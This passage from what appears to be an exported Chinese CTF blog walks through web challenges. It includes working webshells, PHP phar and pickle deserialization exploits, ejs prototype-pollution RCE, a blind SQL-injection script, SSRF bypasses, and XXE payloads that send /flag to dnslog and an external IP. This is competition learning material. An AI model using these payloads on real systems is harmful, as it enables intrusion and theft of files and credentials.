\"文件名\"`相当于执行`include(\"文件名\")`此处可使用PHP过滤器，所以可以先构造a文件包含base64编码后的木马，而后再使用过滤器解码包含执行\n\n```\n//1.png\nPD9waHAgZXZhbCgkX1BPU1RbJ2trayddKTs/Pg==\n//.htaccess\nAddType application/x-httpd-php .png\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=1.png\"\n```\n\n此时再上传任意png并访问即可执行图片马（居然还ban系统命令执行）\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011424854.png)\n\n**后面就是跟着各位大佬WP做出来并且学习到的新知识啦**\n\n## PharPOP\n\n进去之后首先发现传不进去东西，由于Error的存在直接传入无法调用`__destruct`方法也就不能上传文件，看了大佬wp发现是通过构造和反序列化字符串不相等的变量声明数量来导致反序列化过程报错，使得内容被销毁执行`__destruct`方法\n\n下一步就是构造反序列化链了，最终利用到的是air中的`__set`方法利用PHP原生类读文件\n\n> 要触发air类的`__set`魔术方法，需要给不可访问属性赋值，apple类中`__get`有赋值 ，触发`__get`需要读取不可访问属性的值，需要触发tree中`__call`，`__call`是要调用内部不存在的方法，tree中`__destruct`方法内return $this->name();。\n>\n> 再回到air类，我们需要p(value)，p为DirectoryIterator，value为glob://xxxx，又因为apple-get触发air-set，所以apple-flag的值会传给 value，所以让`apple ->flag=‘glob://xxx’` 对于$p，air-get中$p=nana中不存在act属性，`_̲_get`被触发，返回act，…p为act，所以让act=DirectoryIterator。\n>\n> 回到最外层的tree，要触发`__destruct`方法需要利用phpGC机制\n>\n> ————————————————\n> 原文链接：https://blog.csdn.net/weixin_46081055/article/details/125046554\n\n最终构造的exp如下\n\n```php\n<?php\nclass air{\n    public $p;\n}\n\nclass tree{\n    public $name;\n    public $act;\n}\n\nclass apple {\n    public $xxx;\n    public $flag;\n}\nclass banana {\n}\n\n$air = new air();\n$tree = new tree();\n$apple = new apple();\n$bana =new  banana();\n$apple ->flag='glob:///f*';\n$apple ->xxx= $air ;\n$air->p=$bana;\n$bana->act=\"DirectoryIterator\";\n$tree->name= $apple;\n\n$phar = new Phar(\"phar1.phar\"); //后缀名必须为phar\n$phar->startBuffering();\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n$phar->setMetadata([0=>$tree,1=>NULL]); //将自定义的meta-data存入manifest\n$phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering(); ?>\n```\n\n在这里我们要修改一下生成的phar文件，触发php的垃圾回收机制来让tree的`__destruct`方法执行\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311902654.png)\n\n将此处的1修改为0\n\n因为**反序列化的过程是顺序执行**的，所以到第一个属性时，会将`Array[0]`设置为`tree`对象，同时我们又将`Array[0]`设置为`null`，这样前面的`tree`对象便丢失了引用，就会被GC所捕获，就可以执行`__destruct`了。\n\n此时由于phar文件被修改，所以我们需要修复一下文件签名，python脚本如下\n\n```python\nfrom hashlib import sha1\nf = open('./phar1.phar', 'rb').read() # 修改内容后的phar文件\ns = f[:-28] # 获取要签名的数据\nh = f[-8:] # 获取签名类型以及GBMB标识\nnewf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB\nopen('phar2.phar', 'wb').write(newf) # 写入新文件\n```\n\n下一步就是要将文件上传上去了，这里用python脚本来将内容上传\n\n```python\nimport requests\nimport gzip\nimport re\n\nurl = 'http://602ad6c4-4397-47e9-a1ea-d957fe9c0e7c.node4.buuoj.cn:81/'\n\nfile = open(\"./phar2.phar\", \"rb\") #打开文件\nfile_out = gzip.open(\"./phar.zip\", \"wb+\")#创建压缩文件对象，因为不压缩过不了WAF\nprint(file_out)\nfile_out.writelines(file)\nfile_out.close()\nfile.close()\nres=requests.post(\n    url,\n    data={\n        1: 'O:1:\"D\":2:{s:5:\"start\";s:1:\"w\";}',\n        0: open('./phar.zip', 'rb').read()\n    },\n)\nprint(res.text)\n# file_get_contents触发phar反序列化\nres2 = requests.post(\n    url,\n    data={\n        1: 'O:1:\"D\":2:{s:5:\"start\";s:1:\"r\";}',\n        0: 'phar:///tmp/6e1fdc42161a607b4fcdec2222a38881.jpg'\n    }\n)\nprint(res2.text)\n```\n\n拿到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311910669.png)\n\n## ezip\n\n首先是个zip利用的[大佬总结](https://ucasers.cn/zip在CTF-web方向中的一些用法/)，这里要利用的是这个\n\n> 这里根据zip里面压缩着的文件一个个解压，只要执行过`php_zip_extract_file`函数，相应的文件夹之下就会出现那个对应的文件。也就是说如果zip包里面第一个文件能被解压但是第二个文件有错误的话，整个命令的的执行会报错但第一个文件在报错前已经被写下来了。\n>\n> 里面有一个关于php解压漏洞的，如果压缩包其中有一个文件的文件名巨长，就会报错，但是里面的木马已经被解压了。所以直接拿那个脚本进行一波跑：\n\n```python\nimport zipfile\nimport io\n \nmf = io.BytesIO()\nwith zipfile.ZipFile(mf, mode=\"w\", compression=zipfile.ZIP_STORED) as zf:\n    zf.writestr('1.php', b'@<?php eval($_POST[1])?>')\n    zf.writestr('A'*5000, b'AAAAA')\n \nwith open(\"shell.zip\", \"wb\") as f:\n    f.write(mf.getvalue())\n```\n\n尝试读取flag发现没有权限，whoami之后发现用户为www-data，[suid提权](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)，nl命令走\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205311941868.png)\n\n捞到flag\n\n## NodeSoEasy\n\n题目中给了源码，也给了所使用框架的版本号，非常明显的原型链污染，但是在ejs 3.1.7中已经将`outputFunctionName`的原型链污染漏洞修复了~~所以我用这个链子干了半天也没结果~~，看wp利用的是另一个链子`escapeFunction`\n\n```javascript\n{\"__proto__\":{\"__proto__\":{\"client\":true,\"escapeFunction\":\"1; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag');\",\"compileDebug\":true}}}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205312011891.png)\n\n## middle\n\npickle反序列化捏，自己构造脚本咯\n\n```php\nimport base64\nimport pickle\nimport config\ndef backdoor():\n    return 1;\nclass People(object):\n    def __reduce__(self):\n        return (config.backdoor, ([\"os.popen('cat /flag*').read()\"],))\na = People()\nc = pickle.dumps(a)\nprint(base64.b64encode(c))\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"PHP反序列化原生类","url":"/posts/5b8865fe.html","content":"\n有时候反序列化会碰到没有给出足够使用的类的时候，这时我们可以利用一把PHP自带的原生类进行构造（以下内容都在PHP7环境中进行测试）\n\n**Exception**\n\n```php\n<?php\n\t\t$a=new Exception(\"1\");\n\t\techo $a;\n\t\t//Exception: 1 in /Users/jlan/PhpstormProjects/untitled/index.php:2 Stack trace: #0 {main}\n?>\n```\n\n我们发现传出的内容为：`Exception: 传入的字符串`如果此时正好有`eval`包裹了该类变量我们就能通过传入`xx;恶意代码;/*`达到任意命令执行的效果\n\n**FilesystemIterator**\n\n```php\n<?php\n  \t$a=new FilesystemIterator(\"./\");\n  \techo $a;\n  \t//index.php\n?>\n```\n\n传入目录返回一个迭代器，`toString`返回迭代器的第一项，可使用glob协议进行通配\n\n**DirectoryIterator**\n\n```php\n<?php\n  \t$a=new DirectoryIterator(\"./\");\n  \techo $a;\n  \t//index.php\n?>\n```\n\n同上\n\n**GlobIterator**\n\n```\n<?php\n$a=new GlobIterator(\"./f*\");\necho $a;\n//flag.txt\n?>\n```\n\nGlobIterator和上方这两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容\n\n**SplFileObject**\n\n```php\n<?php\n    $a=new SplFileObject(\"./flag.txt\");\n    echo $a;\n\t\t//读取文件首行内容\n?>\n```\n\nSplFileObject这个类返回的也是一个迭代器，但是可以用伪协议啊\n\n**SplFileInfo**\n\n```php\n<?php\n    $a=new SplFileInfo(\"phpinfo();\");\n    echo $a;\n    //phpinfo();\n    eval($a);\n?>\n```\n\n原封不动返回传入内容\n\n**Error**\n\n和**Exception**完全一致\n"},{"title":"ISCC2022","url":"/posts/8cbc7f95.html","content":"\n### Easy-SQL\n\nselect被ban了，只能先尝试捞出数据库了\n\n```\ndatabase：security\nuser：test\nversion：8.0.28\n```\n\n没有select只能看MySQL8的新特性了\n\n使用mysql8.x的新增命令values直接union输出\n\n**系统表更换为InnoDB表**\n\n系统表全部换成事务型的innodb表，默认的MySQL实例将不包含任何MyISAM表，除非手动创建MyISAM表\n\n**TABLE STATEMENT**\n\ntable语句是mysql8.0.19引入的语句，作用是返回表的全部内容，也就是返回表的行和列\n\n```sql\ntable mysql.user union mysql.user\n```\n\n**VALUES STATEMENT**\n\nvalues语句通过给出值的方式直接组成一个表，也就是可以把一个或者多个数据作为表来展示出来，返回的是一个表数据,当用union查询时，列数如果不对会发生报错\n\n```sql\nvalues row(1,2,3),row(2,3,4);\nvalues row(1,2,3) union values row(2,3,4);\n```\n\n利用`?id=0||('~','','','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit 1)`\n\n找到information_schema.columns中共有22列数据，脚本爆破出表名\n\n```python\nimport requests\n\nurl = \"http://59.110.159.206:7010/?id=\"\nfor k in range(732, 740):\n    table = \"\"\n    column = \"\"\n    for j in range(732, 739):\n        for l in range(1, 100):\n            for i in range(1, 127):\n                ttable = table + chr(i)\n                com = f\"0||('def','security','{ttable}','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                tex = requests.get(url + com).text\n                if \"Dumb\" in tex:\n                    table = table + chr(i - 1)\n                    print(table)\n                    break\n            com = f\"0||('def','security','{table + chr(33)}','','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n            tex = requests.get(url + com).text\n            if \"Dumb\" in tex:\n                print(table)\n                for l in range(1, 100):\n                    for i in range(1, 127):\n                        tcolumn = column + chr(i)\n                        com = f\"0||('def','security','{table}','{tcolumn}','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                        tex = requests.get(url + com).text\n                        if \"Dumb\" in tex:\n                            column = column + chr(i - 1)\n                            break\n                    com = f\"0||('def','security','{table}','{column + chr(33)}','','','','','','','','','','','','','','','','','','')>(table information_schema.columns limit {k},1)\"\n                    tex = requests.get(url + com).text\n                    if \"Dumb\" in tex:\n                        print(table + '.' + column)\n                        break\n        break\n\n```\n\n列名同样\n\n```\nsecurity\n\tusers\n\t\tID\n\t\tUSERNAME\n\t\tPASSWD\n\temails\n\t\tG\n\t\tQ\n\t\t=\n\tflag\n\t\tG\n\t\tFe\n```\n\n使用union table来捞出邮箱\n\n```\n?id=0 union (table security.emails limit 7,1)\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-04 16.00.43.png)\n\n看源码\n\n```php\n<?php\ninclude \"./config.php\";\n// error_reporting(0);\n// highlight_file(__FILE__);\n$conn = mysqli_connect($hostname, $username, $password, $database);\n   if ($conn->connect_errno) {\n    die(\"Connection failed: \" . $conn->connect_errno);\n} \n\necho \"Where is the database?\".\"<br>\";\n\necho \"try ?id\";\n\nfunction sqlWaf($s)\n{\n    $filter = '/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|<|;|\"|\\^|\\||\\ |\\'/i';\n    if (preg_match($filter,$s))\n        return False;\n    return True;\n}\n\nif (isset($_GET['id'])) \n{\n    $id = $_GET['id'];\n    $sql = \"select * from users where id=$id\";\n    $safe = preg_match('/select/is', $id);\n    if($safe!==0)\n        die(\"No select!\");\n    $result = mysqli_query($conn, $sql);\n    if ($result) \n    {\n        $row = mysqli_fetch_array($result);\n        echo \"<h3>\" . $row['username'] . \"</h3><br>\";\n        echo \"<h3>\" . $row['passwd'] . \"</h3>\";\n    }\n    else\n        die('<br>Error!');\n}\n\n\nif (isset($_POST['username']) && isset($_POST['passwd'])) \n{\n\n    $username = strval($_POST['username']);\n    $passwd = strval($_POST['passwd']);\n\n    if ( !sqlWaf($passwd) )\n        die('damn hacker');\n\n    $sql = \"SELECT * FROM users WHERE username='${username}' AND passwd= '${passwd}'\";\n    $result = $conn->query($sql);\n    if ($result->num_rows > 0) {\n        $row = $result->fetch_assoc();\n        if ( $row['username'] === 'admin' && $row['passwd'] )\n        {\n            if ($row['passwd'] == $passwd)\n            {\n                die($flag);\n            } else {\n                die(\"username or passwd wrong, are you admin?\");\n            }\n        } else {\n            die(\"wrong user\");\n        }\n    } else {\n        die(\"user not exist or wrong passwd\");\n    }\n}\nmysqli_close($conn); \n?>\n\n```\n\n要求结果中查询出的用户名为admin并且提交的密码和查询的密码相同才能拿到flag，在passwd处做了过滤，那么我们就在username处进行注入就行了，在上面已经得到了users表共有三列，直接union select构造我们自己的username和passwd\n\n```\npayload:\nPOST\nusername='union select '1','admin','1'%23&passwd=1\n```\n\n### 冬奥会\n\narray_search弱比较，传入数字即可\n\n```\npayload:?Information={\"year\":\"2022a\",\"items\":[0,[1,2],1]}\n```\n\n### findme\n\n```php\n<?php \nhighlight_file(__FILE__); \n\nclass a{ \n    public $un0; \n    public $un1; \n    public $un2; \n    public $un3; \n    public $un4; \n     \n    public function __destruct(){ \n        if(!empty($this->un0) && empty($this->un2)){ \n            $this -> Givemeanew(); \n            if($this -> un3 === 'unserialize'){ \n                $this -> yigei(); \n            } \n            else{ \n                $this -> giao(); \n            } \n        } \n    } \n\n    public function Givemeanew(){ \n        $this -> un4 = new $this->un0($this -> un1); \n    } \n\n    public function yigei(){ \n        echo 'Your output: '.$this->un4; \n    } \n     \n    public function giao(){ \n        @eval($this->un2); \n    } \n     \n    public function __wakeup(){ \n        include $this -> un2.'hint.php'; \n    } \n} \n\n$data = $_POST['data']; \nunserialize($data);\n```\n\n原生类反序列化，先用伪协议读出提示\n\n","tags":["CTF","web"]},{"title":"CTFshowXXE","url":"/posts/949d2db6.html","content":"\n## XML基础知识\n\n要了解xxe漏洞，那么一定得先明白基础知识，了解xml文档的基础组成。\n\n> XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素\n\n### xml的基本格式\n\n```\n- 所有 XML 元素都须有关闭标签\n- XML 标签对大小写敏感\n- XML 必须正确地嵌套\n- XML 文档必须有根元素\n- XML 的属性值须加引号\n```\n\n这里放一个正规的例子\n\n```xml\n<bookstore> <!--根元素-->\n<book category=\"COOKING\"> <!--bookstore的子元素，category为属性-->\n<title>Everyday Italian</title>      <!--book的子元素，lang为属性-->\n<author>Giada De Laurentiis</author>       <!--book的子元素-->\n<year>2005</year> <!--book的子元素-->\n<price>30.00</price> <!--book的子元素-->\n</book> <!--book的结束-->\n</bookstore> <!--bookstore的结束-->\n```\n\n### DTD\n\n文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD可被成行地声明于XML文档中，也可作为一个外部引用。带有DTD的XML文档实例\n\n```xml-dtd\n<?xml version=\"1.0\"?>//这一行是 XML 文档定义\n<!DOCTYPE message [\n<!ELEMENT message (receiver ,sender ,header ,msg)>\n<!ELEMENT receiver (#PCDATA)>\n<!ELEMENT sender (#PCDATA)>\n<!ELEMENT header (#PCDATA)>\n<!ELEMENT msg (#PCDATA)>\n```\n\n上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这样\n\n```xml\n<message>\n<receiver>Myself</receiver>\n<sender>Someone</sender>\n<header>TheReminder</header>\n<msg>This is an amazing book</msg>\n</message>\n```\n\n### 内部实体\n\n带有DTD的XML文档实例\n\n```xml-dtd\n<?xml version=\"1.0\"?>//这一行是 XML 文档定义\n<!DOCTYPE message [\n<!ELEMENT message (receiver ,sender ,header ,msg)>\n<!ELEMENT receiver (#PCDATA)>\n<!ELEMENT sender (#PCDATA)>\n<!ELEMENT header (#PCDATA)>\n<!ELEMENT msg (#PCDATA)>\n<message>\n<receiver>Myself</receiver>\n<sender>Someone</sender>\n<header>TheReminder</header>\n<msg>This is an amazing book</msg>\n</message>\n```\n\n其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的\n\n```xml-dtd\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe \"test\" >]>\n```\n\n这里 定义元素为`ANY`说明接受任何元素，但是定义了一个 xml 的实体（实体其实可以看成一个变量，到时候我们可以在 XML 中通过 & 符号进行引用），那么 XML 就可以写成这样\n\n```xml-dtd\n<creds>\n<user>&xxe;</user>\n<pass>mypass</pass>\n</creds>\n```\n\n我们使用&xxe对上面定义的xxe实体进行了引用，到时候输出的时候&xxe就会被 “test” 替换。\n\n### 外部实体\n\n实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE root-element SYSTEM \"file:///c:/test.dtd\">\n<note>\n<to>Y0u</to>\n<from>@re</from>\n<head>v3ry</head>\n<body>g00d!</body>\n</note>\n```\n\n```xml-dtd\n<!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->\n<!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->\n<!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->\n<!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->\n```\n\n![](https://img-blog.csdnimg.cn/20210305225448278.png)\n\n当然，还有一种引用方式是使用 引用公用 DTD 的方法，语法如下：\n\n```xml-dtd\n<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>\n```\n\n这个在我们的攻击中也可以起到和 SYSTEM 一样的作用\n\n我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）\n\n### 通用实体\n\n用`&实体名;` 引用的实体，他在DTD 中定义，在 XML 文档中引用\n\n```xml-dtd\n<?xml version=\"1.0\" encoding=\"utf-8\"?> \n<!DOCTYPE updateProfile [<!ENTITY file SYSTEM \"file:///c:/windows/win.ini\"> ]> \n<updateProfile>  \n    <firstname>Joe</firstname>  \n    <lastname>&file;</lastname>  \n    ... \n</updateProfile>\n```\n\n### 参数实体\n\n(1)使用 % 实体名(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 %实体名; 引用\n(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体\n(3)和通用实体一样，参数实体也可以外部引用\n\n```xml-dtd\n<!ENTITY % an-element \"<!ELEMENT mytag (subtag)>\"> \n<!ENTITY % remote-dtd SYSTEM \"http://somewhere.example.org/remote.dtd\"> \n%an-element; %remote-dtd;\n```\n\n在了解了基础知识后，下面开始了解xml外部实体注入引发的问题\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**373**\n\n最简单的版本咯，带回显直接构造\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE xml [\n<!ENTITY xxe SYSTEM \"file:///flag\">\n]>\n<j1an>\n<ctfshow>&xxe;</ctfshow>\n</j1an>\n```\n\n**374**\n\n没有回显需要外带了\n\n```xml-dtd\n<?xml version=\"1.0\"?>\n<!DOCTYPE xml [\n<!ENTITY file SYSTEM \"file:///flag\">\n<!ENTITY xxe SYSTEM \"http://&file;.i1ecvd.dnslog.cn\">\n]>\n<j1an>\n<ctfshow>&xxe;</ctfshow>\n</j1an>\n```\n\n这种方法不知道为啥带不出来\n\n```xml-dtd\n<!DOCTYPE ANY[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n<!ENTITY % remote SYSTEM \"http://20.231.29.154/1.xml\">\n%remote;\n%send;\n]>\n```\n\n```xml-dtd\n#1.xml\n<!ENTITY % all\n\"<!ENTITY &#x25; send SYSTEM 'http://20.231.29.154/1.php?1=%file;'>\"\n>\n&all;\n```\n\n","tags":["CTF","web"]},{"title":"CTFshowSSRF","url":"/posts/b1fc6cca.html","content":"\n## SSRF基础\n\nSSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n\n## 相关函数和类\n\nfile_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中\nreadfile()：输出一个文件的内容\nfsockopen()：打开一个网络连接或者一个Unix 套接字连接\ncurl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用\nfopen()：打开一个文件文件或者 URL\nPHP原生类SoapClient在触发反序列化时可导致SSRF\n\n## 相关协议\n\nfile协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容\ndict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等\ngopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell\nhttp/s协议：探测内网主机存活\n\n## 绕过方法\n\n- `http://0.0.0.0/`\n\n  测试了下这个方法只能在linux下使用，windows并不认识这个IP\n\n- `http://foo@127.0.0.1:80@www.google.com/hint.php`\n\n  此处利用了不同库解析url的差异\n\n  ![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206181201647.JPG)\n\n  不过这个方法在curl较新的版本里被修掉了，buu上的环境也无法使用\n\n- DNS Rebinding\n\n  用这个，将同一域名绑定在不同的IP下，这样返回DNS请求查询的时候随机返回一个，就导致判断和真正curl发送请求的不是同一个IP\n\n- `http://127。0。0。1/hint.php`\n\n  这个本地倒是测试成功了，buu上就不行，可能跟curl版本有关吧\n\n- `http://127.1/hint.php`\n\n  `ip2long('127.1')`会返回`false`，这里可以绕过\n\n  但是`gethostbyname`在linux下会把`127.1`变为`127.0.0.1`，所以这题是无法使用的\n\n  不过windows下经过`gethostbyname`后依然是`127.1`，curl是支持`127.1`这样的写法的，但这样发出去的http请求是有问题的。因为http包中的host头被设为了`127.1`，apache会返回一个400 Bad Request\n\n  但是这样构造的gopher请求是可行的\n\n- 进制绕过\n\n- 和127.1类似，也是存在不能用http的问题，但是`gethostbyname`并不会有影响，可用比如\n\n  ```\n  gopher://0177.0.0x0001:80\n  ```\n\n- `http://127.0.0.1./`\n\n  curl不支持\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n**351**\n\n```PHP\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n$ch=curl_init($url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($ch);\ncurl_close($ch);\necho ($result);\n?>\n# curl_init — 初始化 cURL 会话    \n# curl_setopt — 设置一个cURL传输选项\n# curl_exec — 执行 cURL 会话\n# curl_close — 关闭 cURL 会话\n```\n\n\n\n```\npayload:\nPOST:\nurl=http://127.0.0.1/flag.php\n```\n\n**352**\n\n`parse_url`函数作用是将一个URL拆分，格式如下：\n\n```PHP\n<?php\n$url = 'http://username:password@hostname/path?arg=value#anchor';\nprint_r(parse_url($url));\n?>\n以上例程会输出：\nArray\n(\n[scheme] => http\n[host] => hostname\n[user] => username\n[pass] => password\n[path] => /path\n[query] => arg=value\n[fragment] => anchor\n)\n```\n\n同上即可\n\n**353**\n\n绕过127.0.0.1，可使用进制转换或其他IP\n\n```\n进制转换：\n整数转换过程，将每一位IP转换为二进制并进行拼接\n2130706433 //十进制整数\n0x7F.0.0.1 //十六进制\n0177.0.0.1 //八进制\n0x7F000001 //十六进制整数\n```\n\n```\n其他IP：\n127.127.127.127\n0\n0.0.0.0\n```\n\n**354**\n\n过滤没了，只能指向其他域名\n\n1、将自己域名解析为127.0.0.1\n\n2、将自己网站设置为302重定向到127.0.0.1\n\n**355**\n\n用0或者127.1\n\n0在linux系统中会解析成127.0.0.1在windows中解析成0.0.0.0\n\n**356**\n\n更短了只能用0\n\n**357**\n\n```PHP\ngethostbyname — 返回主机名对应的 IPv4地址\n# php filter函数\nfilter_var()\t获取一个变量，并进行过滤\nfilter_var_array()\t获取多个变量，并进行过滤\n......\n# PHP 过滤器\nFILTER_VALIDATE_IP\t把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围\nFILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）\nFILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）\nFILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）\nFILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。\n```\n\n由于获取到了指向域名的IP值所以域名指向127.0.0.1不再生效，只能使用302重定向或者**DNS rebinding（DNS重新绑定攻击）**\n\n### DNS rebinding：\n\n```\n攻击重点在于DNS服务能够在两次DNS查询中返回不用的IP地址，第一次是真正的IP，第二次是攻击目标IP地址，甚至可以通过这种攻击方法绕过同源策略\n回到题目，在题目代码中一共对域名进行了两次请求，第一次是 gethostbyname 方法，第二次则是 file_get_contents 文件读取，可以通过 ceye.io 来实现攻击，DNS Rebinding 中设置两个 IP，一个是 127.0.0.1 另一个是随便可以访问的 IP\n```\n\n**358**\n\n正则匹配要求URL以http://ctf.开头，以show结尾\n\n一个完整的URL的格式如下\n\n`http://username:password@hostname/path?arg=value#anchor`\n\n其中hostname就是我们平常使用的网址，我们只需要让username位置为ctf.，让anchor位置为show即可\n\n```\npayload:\nPOST\nurl=http://ctf.@127.0.0.1/flag.php#show\n```\n\n**359**\n\n随便输入个用户名密码尝试登录\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 01.12.20.png)\n\n抓包发现returl参数可能存在SSRF注入点，使用Gopherus生成攻击payload\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 22.36.11.png)\n\n写入之后访问即可\n\n**360**\n\n同上\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-01 22.44.48.png)\n\n\n\n\n\n","tags":["CTF","web"]},{"title":"CTFshow记录","url":"/posts/82271b5a.html","content":"\n### baby杯——baby_php\n\n审计代码，明显是文件上传\n\n```PHP\nclass fileUtil{\n\n    private $name;\n    private $content;\n\n\n    public function __construct($name,$content=''){\n        $this->name = $name;\n        $this->content = $content;\n        ini_set('open_basedir', '/var/www/html');\n    }\n\n    public function file_upload(){\n        if($this->waf($this->name) && $this->waf($this->content)){\n            return file_put_contents($this->name, $this->content);\n        }else{\n            return 0;\n        }\n    }\n\n    private function waf($input){\n        return !preg_match('/php/i', $input);\n    }\n\n    public function file_download(){\n        if(file_exists($this->name)){\n            header('Content-Type: application/octet-stream');\n            header('Content-Disposition: attachment; filename=\"'.$this->name.'\"');\n            header('Content-Transfer-Encoding: binary');\n            echo file_get_contents($this->name);\n        }else{\n            return False;\n        }\n    }\n\n    public function __destruct(){\n\n    }\n\n}\n\n$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);\n\nif($action==='upload'){\n    die('Permission denied');\n}\n\nswitch ($action) {\n    case 'upload':\n        $name = $_POST['name'];\n        $content = $_POST['content'];\n        $ft = new fileUtil($name,$content);\n        if($ft->file_upload()){\n            echo $name.' upload success!';\n        }\n        break;\n    case 'download':\n        $name = $_POST['name'];\n        $ft = new fileUtil($name,$content);\n        if($ft->file_download()===False){\n            echo $name.' download failed';\n        }\n        break;\n    default:\n        echo 'baby come on';\n        break;\n}\n```\n\n小知识：$_GET['a']在没有被赋值时默认值时true，case的判定是弱相等\n\n关键代码\n\n```PHP\n$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);\n\nif($action==='upload'){//a只声明不赋值默认为true，强相等判定无法通过\n    die('Permission denied');\n}\n\nswitch ($action) {\n    case 'upload'://true==\"upload\"，判定结果为真，进入upload上传文件\n```\n\n查看响应头中间件为nginx，上传.user.ini文件来包含，一定要先上传1.txt文件，不然在auto_prepend_file参数生效并且找不到1.txt时整个环境就废了\n\n```\npayload:?a=\nPOST:\ncontent=<?=`$_GET['kkk']`;?>&name=1.txt\nPOST:\ncontent=auto_prepend_file=\"1.txt\"&name=.user.ini\n\npayload:?kkk=tac /flag_baby_here_you_are\n```\n\n","tags":["CTF","web"]},{"title":"CTFshowSSTI","url":"/posts/45647.html","content":"\n# SSTI\n\n### **Python中有用的魔术方法**\n\n```python\n__class__           查看对象所在的类\n__mro__             查看继承关系和调用顺序，返回元组\n__base__            返回基类\n__bases__           返回基类元组\n__subclasses__()    返回子类列表\n__init__            调用初始化函数，可以用来跳到__globals__\n__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典\n__builtins__        返回内建内建名称空间字典\n__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里\n__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）\t\t都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。\n__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')\n__builtins__         